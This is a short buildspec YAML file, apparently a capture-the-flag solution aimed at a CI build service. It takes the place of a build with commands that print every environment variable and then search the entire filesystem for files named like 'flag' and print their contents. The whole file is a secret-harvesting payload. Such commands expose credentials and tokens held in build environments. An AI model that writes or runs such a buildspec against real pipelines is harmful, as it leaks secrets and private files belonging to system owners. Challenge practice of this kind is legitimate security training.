version: 0.2
phases:
  build:
    commands:
      - echo "Checking environment..."
      - env
      - echo "Searching for the flag..."
      - find / -name "*flag*" 2>/dev/null -exec cat {} + || true
